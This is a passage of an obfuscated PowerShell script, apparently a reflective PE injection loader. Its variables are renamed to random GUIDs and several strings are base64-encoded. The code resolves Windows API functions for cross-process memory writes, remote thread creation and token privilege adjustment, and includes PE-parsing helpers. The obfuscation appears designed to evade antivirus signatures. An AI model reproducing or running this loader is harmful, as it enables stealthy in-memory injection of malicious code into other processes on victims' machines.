		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		return ${bf6addb5678a4306bbd927c2e94d4ede}
	}
	Function Get-Win32Functions
	{
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} = New-Object System.Object
		${1721d0b3416e4014977bd2648c45019e} = Get-ProcAddress kernel32.dll VirtualAlloc
		${2180d9dad5a24e54b6d496b524e2c3f0} = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${d53c284107b740bb8069149c59c8eac1} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${1721d0b3416e4014977bd2648c45019e}, ${2180d9dad5a24e54b6d496b524e2c3f0})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member NoteProperty -Name VirtualAlloc -Value ${d53c284107b740bb8069149c59c8eac1}
		${e03eed3f11f24c5d94b533b5c653dde5} = Get-ProcAddress kernel32.dll VirtualAllocEx
		${089e74ee3ab14227b2e7f2121a505767} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${951b58bfa3da46c58463ad162533470d} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${e03eed3f11f24c5d94b533b5c653dde5}, ${089e74ee3ab14227b2e7f2121a505767})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member NoteProperty -Name VirtualAllocEx -Value ${951b58bfa3da46c58463ad162533470d}
		${d39c3800247a4cad8db2427a41a7efb4} = Get-ProcAddress msvcrt.dll memcpy
		${2ba12ec351594439ba85f15d4c3a9bfe} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${9944a31f31d34481bae7502ce13656c6} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${d39c3800247a4cad8db2427a41a7efb4}, ${2ba12ec351594439ba85f15d4c3a9bfe})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name memcpy -Value ${9944a31f31d34481bae7502ce13656c6}
		${77f537410b144eba8279451d2c7ff38f} = Get-ProcAddress msvcrt.dll memset
		${7eb3790bc44941e1a021c3c08a127f1e} = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${493192ccd6f84ab68fd8e9642f1898cf} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${77f537410b144eba8279451d2c7ff38f}, ${7eb3790bc44941e1a021c3c08a127f1e})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name memset -Value ${493192ccd6f84ab68fd8e9642f1898cf}
		${7738da1fc15e47abb9fa0acb0443eca4} = Get-ProcAddress kernel32.dll LoadLibraryA
		${46b00ca34f92445abdb55c3a11e4854c} = Get-DelegateType @([String]) ([IntPtr])
		${0e3f04ae014244e48d68c06d5f8e6f73} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${7738da1fc15e47abb9fa0acb0443eca4}, ${46b00ca34f92445abdb55c3a11e4854c})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value ${0e3f04ae014244e48d68c06d5f8e6f73}
		${0fefc8d04834473691863168d298ecea} = Get-ProcAddress kernel32.dll GetProcAddress
		${32d3abbdb16741d88defef8fd054d743} = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		${531fb553093c4600a842387ae47025f9} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${0fefc8d04834473691863168d298ecea}, ${32d3abbdb16741d88defef8fd054d743})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value ${531fb553093c4600a842387ae47025f9}
		${5dabf492e61a41cdb9e59a4a2164100f} = Get-ProcAddress kernel32.dll GetProcAddress
		${500d7946af504c378da521bd5b911947} = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		${cbad4b0852b24f0bae3c17524c0f56e0} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${5dabf492e61a41cdb9e59a4a2164100f}, ${500d7946af504c378da521bd5b911947})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value ${cbad4b0852b24f0bae3c17524c0f56e0}
		${30651494c1c8422c800aa5e5cfb50350} = Get-ProcAddress kernel32.dll VirtualFree
		${72952a82313442638ba6d020e617a229} = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${e5ff6eb02a124ada8843e88e84f03400} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${30651494c1c8422c800aa5e5cfb50350}, ${72952a82313442638ba6d020e617a229})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member NoteProperty -Name VirtualFree -Value ${e5ff6eb02a124ada8843e88e84f03400}
		${0bfc28493b52445ba38eb68bcc18a374} = Get-ProcAddress kernel32.dll VirtualFreeEx
		${85a32d67e28041b1a29a88756739a97e} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${f70e95e52de84ef687fa76383b19627a} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${0bfc28493b52445ba38eb68bcc18a374}, ${85a32d67e28041b1a29a88756739a97e})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member NoteProperty -Name VirtualFreeEx -Value ${f70e95e52de84ef687fa76383b19627a}
		${a9613a143ea24d7dbdd3d8f439461adc} = Get-ProcAddress kernel32.dll VirtualProtect
		${97b7a4102ed4464b8acc712850456313} = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		${4a90337d6642409ea114399624be394e} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${a9613a143ea24d7dbdd3d8f439461adc}, ${97b7a4102ed4464b8acc712850456313})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member NoteProperty -Name VirtualProtect -Value ${4a90337d6642409ea114399624be394e}
		${c188fed92f5c4b789eaf4d5ddf6203a4} = Get-ProcAddress kernel32.dll GetModuleHandleA
		${305934643467446eb388f834878466d2} = Get-DelegateType @([String]) ([IntPtr])
		${d130d77430f24638a54836189df602de} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${c188fed92f5c4b789eaf4d5ddf6203a4}, ${305934643467446eb388f834878466d2})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member NoteProperty -Name GetModuleHandle -Value ${d130d77430f24638a54836189df602de}
		${c671304e89c441329b9428119cff28d5} = Get-ProcAddress kernel32.dll FreeLibrary
		${626e850c673347e694913de8f1ae1d89} = Get-DelegateType @([Bool]) ([IntPtr])
		${e5fd67b876a44453a370cbf47ea24c41} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${c671304e89c441329b9428119cff28d5}, ${626e850c673347e694913de8f1ae1d89})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${e5fd67b876a44453a370cbf47ea24c41}
		${19843b492d1b4243a099baed4b0f2432} = Get-ProcAddress kernel32.dll OpenProcess
	    ${b412255ea15d4323900510e01ba9888a} = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${599a56f332844f5d817c05e76b411543} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${19843b492d1b4243a099baed4b0f2432}, ${b412255ea15d4323900510e01ba9888a})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${599a56f332844f5d817c05e76b411543}
		${2fc1bd73c2da4d15b4da6492c253beac} = Get-ProcAddress kernel32.dll WaitForSingleObject
	    ${0cd6f7b31dc241e6a2dba92800b270a7} = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    ${a0559fbfa2344d87847422289af4e86e} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${2fc1bd73c2da4d15b4da6492c253beac}, ${0cd6f7b31dc241e6a2dba92800b270a7})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${a0559fbfa2344d87847422289af4e86e}
		${2e973bbd62dc4ca79b5e9aabdb6211b4} = Get-ProcAddress kernel32.dll WriteProcessMemory
        ${728dedbeb33a494eaf5b0cd13890f2cd} = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${cb05f740a45645eca0bba49ed0f8b805} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${2e973bbd62dc4ca79b5e9aabdb6211b4}, ${728dedbeb33a494eaf5b0cd13890f2cd})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${cb05f740a45645eca0bba49ed0f8b805}
		${eea0cc81daa947b0a83b42a5bfbe0399} = Get-ProcAddress kernel32.dll ReadProcessMemory
        ${896008e25d2842ac9f68467784c3cd15} = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${ff098bff8a6f4f51b8ae4b0fd8be2175} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${eea0cc81daa947b0a83b42a5bfbe0399}, ${896008e25d2842ac9f68467784c3cd15})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${ff098bff8a6f4f51b8ae4b0fd8be2175}
		${e1dc4ca91754484ab74883a11ec13395} = Get-ProcAddress kernel32.dll CreateRemoteThread
        ${d3fcb84419214808bf39ab3cbd9f20e9} = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${ab08c6c0f33548ddaa336f2945204354} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${e1dc4ca91754484ab74883a11ec13395}, ${d3fcb84419214808bf39ab3cbd9f20e9})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${ab08c6c0f33548ddaa336f2945204354}
		${b475449f97b64ff1919ad6fbde09eb66} = Get-ProcAddress kernel32.dll GetExitCodeThread
        ${d8a26aca8a3545dda503dcb37a124cf6} = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${dd01cdae51d64a8fa7e812cf432aabc4} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${b475449f97b64ff1919ad6fbde09eb66}, ${d8a26aca8a3545dda503dcb37a124cf6})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${dd01cdae51d64a8fa7e812cf432aabc4}
		${8104567b813145948e849341d55570a3} = Get-ProcAddress Advapi32.dll OpenThreadToken
        ${a0339a7c1d96424ea4209dca37379739} = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${37d77e7247f3485ea1ed5b97d738e8eb} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${8104567b813145948e849341d55570a3}, ${a0339a7c1d96424ea4209dca37379739})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${37d77e7247f3485ea1ed5b97d738e8eb}
		${aa0f2cc4ae8c4bb2a1b72f9d0fd8e454} = Get-ProcAddress kernel32.dll GetCurrentThread
        ${0ba23402de2946089d9e225cbfd388f1} = Get-DelegateType @() ([IntPtr])
        ${efe332889b984b72b4f3d4fdc83fb3f6} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${aa0f2cc4ae8c4bb2a1b72f9d0fd8e454}, ${0ba23402de2946089d9e225cbfd388f1})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${efe332889b984b72b4f3d4fdc83fb3f6}
		${94f29f66d64c41a6a8b256e5a552626d} = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        ${3d34cf3245fc4f1c8246cefce4f16ab0} = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${40fe231823b041bea8d4d6dbd36fe35e} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${94f29f66d64c41a6a8b256e5a552626d}, ${3d34cf3245fc4f1c8246cefce4f16ab0})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${40fe231823b041bea8d4d6dbd36fe35e}
		${9bf988eafaaa4c0a8d27eaa850d1addd} = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        ${4779e68fd1134795ab5f9cc3d1a17010} = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        ${5d2ccc2512fe4116b6a392ad84cb26d5} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${9bf988eafaaa4c0a8d27eaa850d1addd}, ${4779e68fd1134795ab5f9cc3d1a17010})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${5d2ccc2512fe4116b6a392ad84cb26d5}
		${25419f633e7c470594b8544605ca25d7} = Get-ProcAddress Advapi32.dll ImpersonateSelf
        ${0d1cd91e43784c70861ff87ea97d548b} = Get-DelegateType @([Int32]) ([Bool])
        ${ef4370f727794e10afc698ca0e081a74} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${25419f633e7c470594b8544605ca25d7}, ${0d1cd91e43784c70861ff87ea97d548b})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${ef4370f727794e10afc698ca0e081a74}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
		    ${62225a6f707e47859f529f22ba70b2ed} = Get-ProcAddress NtDll.dll NtCreateThreadEx
            ${2e5144f142b444f18e0071b14deff57c} = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${4950a32f2fd549cabdedacd0d2e43693} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${62225a6f707e47859f529f22ba70b2ed}, ${2e5144f142b444f18e0071b14deff57c})
		    ${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${4950a32f2fd549cabdedacd0d2e43693}
        }
		${2139a34d612e490f8b6c889a472e2934} = Get-ProcAddress Kernel32.dll IsWow64Process
        ${7f8ee793e1e54ee7a1c5661a921da706} = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${10c9d407c51d4999af8330fc0354f10f} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${2139a34d612e490f8b6c889a472e2934}, ${7f8ee793e1e54ee7a1c5661a921da706})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${10c9d407c51d4999af8330fc0354f10f}
		${66cb9b0a52fc4002b6d287da9c84b186} = Get-ProcAddress Kernel32.dll CreateThread
        ${01fb5ca874704aa2bcffef964c84864e} = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${91f320b9e1b8401d886d5eee380f3355} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${66cb9b0a52fc4002b6d287da9c84b186}, ${01fb5ca874704aa2bcffef964c84864e})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${91f320b9e1b8401d886d5eee380f3355}
		${8c041aeff7df4bf292a52dd141921e06} = Get-ProcAddress kernel32.dll VirtualFree
		${e46f4da2b0624e258c01346bdb37a227} = Get-DelegateType @([IntPtr])
		${58326331edef42198cbfd4a3b6eb75bb} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${8c041aeff7df4bf292a52dd141921e06}, ${e46f4da2b0624e258c01346bdb37a227})
		${a36b17e7e2e643b69f9b9e1a2bd60bb9} | Add-Member NoteProperty -Name LocalFree -Value ${58326331edef42198cbfd4a3b6eb75bb}
		return ${a36b17e7e2e643b69f9b9e1a2bd60bb9}
	}
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${df989d8b19f84805beb060461cb922d8},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${cdd91eeb703a4935af5827102702342c}
		)
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes(${df989d8b19f84805beb060461cb922d8})
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes(${cdd91eeb703a4935af5827102702342c})
		[Byte[]]${94e1d22116eb4c7c80396f69e82435a1} = [BitConverter]::GetBytes([UInt64]0)
		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			${2e5ce295a4ed412e9e6eefa45ab13e78} = 0
			for (${4c7705bd7e4a4adbb1ff54055067af60} = 0; ${4c7705bd7e4a4adbb1ff54055067af60} -lt $Value1Bytes.Count; ${4c7705bd7e4a4adbb1ff54055067af60}++)
			{
				${c8460db8e9a2447084eb79d25ce96c65} = $Value1Bytes[${4c7705bd7e4a4adbb1ff54055067af60}] - ${2e5ce295a4ed412e9e6eefa45ab13e78}
				if (${c8460db8e9a2447084eb79d25ce96c65} -lt $Value2Bytes[${4c7705bd7e4a4adbb1ff54055067af60}])
				{
					${c8460db8e9a2447084eb79d25ce96c65} += 256
					${2e5ce295a4ed412e9e6eefa45ab13e78} = 1
				}
				else
				{
					${2e5ce295a4ed412e9e6eefa45ab13e78} = 0
				}
				[UInt16]$Sum = ${c8460db8e9a2447084eb79d25ce96c65} - $Value2Bytes[${4c7705bd7e4a4adbb1ff54055067af60}]
				${94e1d22116eb4c7c80396f69e82435a1}[${4c7705bd7e4a4adbb1ff54055067af60}] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${94e1d22116eb4c7c80396f69e82435a1}, 0)
	}
	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${df989d8b19f84805beb060461cb922d8},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${cdd91eeb703a4935af5827102702342c}
		)
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes(${df989d8b19f84805beb060461cb922d8})
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes(${cdd91eeb703a4935af5827102702342c})
		[Byte[]]${94e1d22116eb4c7c80396f69e82435a1} = [BitConverter]::GetBytes([UInt64]0)
		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			${2e5ce295a4ed412e9e6eefa45ab13e78} = 0
			for (${4c7705bd7e4a4adbb1ff54055067af60} = 0; ${4c7705bd7e4a4adbb1ff54055067af60} -lt $Value1Bytes.Count; ${4c7705bd7e4a4adbb1ff54055067af60}++)
			{
				[UInt16]$Sum = $Value1Bytes[${4c7705bd7e4a4adbb1ff54055067af60}] + $Value2Bytes[${4c7705bd7e4a4adbb1ff54055067af60}] + ${2e5ce295a4ed412e9e6eefa45ab13e78}
				${94e1d22116eb4c7c80396f69e82435a1}[${4c7705bd7e4a4adbb1ff54055067af60}] = $Sum -band 0x00FF
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					${2e5ce295a4ed412e9e6eefa45ab13e78} = 1
				}
				else
				{
					${2e5ce295a4ed412e9e6eefa45ab13e78} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${94e1d22116eb4c7c80396f69e82435a1}, 0)
	}
	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${df989d8b19f84805beb060461cb922d8},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${cdd91eeb703a4935af5827102702342c}
		)
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes(${df989d8b19f84805beb060461cb922d8})
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes(${cdd91eeb703a4935af5827102702342c})
		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for (${4c7705bd7e4a4adbb1ff54055067af60} = $Value1Bytes.Count-1; ${4c7705bd7e4a4adbb1ff54055067af60} -ge 0; ${4c7705bd7e4a4adbb1ff54055067af60}--)
			{
				if ($Value1Bytes[${4c7705bd7e4a4adbb1ff54055067af60}] -gt $Value2Bytes[${4c7705bd7e4a4adbb1ff54055067af60}])
				{
					return $true
				}
				elseif ($Value1Bytes[${4c7705bd7e4a4adbb1ff54055067af60}] -lt $Value2Bytes[${4c7705bd7e4a4adbb1ff54055067af60}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		${d54e1ad5642c49269ce91ff8773b0db3}
		)
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes(${d54e1ad5642c49269ce91ff8773b0db3})
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${e39dbe60176b48af8d74a8a90f28e95a},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${c8edec2d3caf433f9746e28faa91f6ff},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${dfccdc8a8c7748d3bab1a84f860772a5},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${d8b42bb3072b496db413a4756f1fa94d}
		)
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned (${dfccdc8a8c7748d3bab1a84f860772a5}) (${d8b42bb3072b496db413a4756f1fa94d}))
		${6ad81c5815444adbae4ace2ffc4310ec} = ${c8edec2d3caf433f9746e28faa91f6ff}.EndAddress
		if ((Compare-Val1GreaterThanVal2AsUInt (${c8edec2d3caf433f9746e28faa91f6ff}.PEHandle) (${dfccdc8a8c7748d3bab1a84f860772a5})) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. ${e39dbe60176b48af8d74a8a90f28e95a}"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) (${6ad81c5815444adbae4ace2ffc4310ec})) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. ${e39dbe60176b48af8d74a8a90f28e95a}"
		}
	}
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${ec206491ad3f4128af1a77bc1c4928e7},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${af6d51d057d949f4a6df10d4847caeef}
		)
		for (${816b72e7915b44e2acca654272f68f27} = 0; ${816b72e7915b44e2acca654272f68f27} -lt ${ec206491ad3f4128af1a77bc1c4928e7}.Length; ${816b72e7915b44e2acca654272f68f27}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${af6d51d057d949f4a6df10d4847caeef}, ${816b72e7915b44e2acca654272f68f27}, ${ec206491ad3f4128af1a77bc1c4928e7}[${816b72e7915b44e2acca654272f68f27}])
		}
	}
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${d41c87198d8d4717aac4ac7ff4a7b67c} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${bb26c57f030c4db2b3cac75f65f5b966} = [Void]
	    )
	    ${453766846d6a4e1581ba9e3574b6c0fa} = [AppDomain]::CurrentDomain
	    ${68b350add2c24cceb9302777c33eaed5} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${6f179f701fd2438182039e368c5d60a4} = ${453766846d6a4e1581ba9e3574b6c0fa}.DefineDynamicAssembly(${68b350add2c24cceb9302777c33eaed5}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${6d8532d17f8644369d653fb2b0b0f4ca} = ${6f179f701fd2438182039e368c5d60a4}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${b26ff3dc7ae04788a47a07d2a2efcca5} = ${065aa676fc9640529d9c661c49eabd94}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${d41c87198d8d4717aac4ac7ff4a7b67c})
	    ${b26ff3dc7ae04788a47a07d2a2efcca5}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
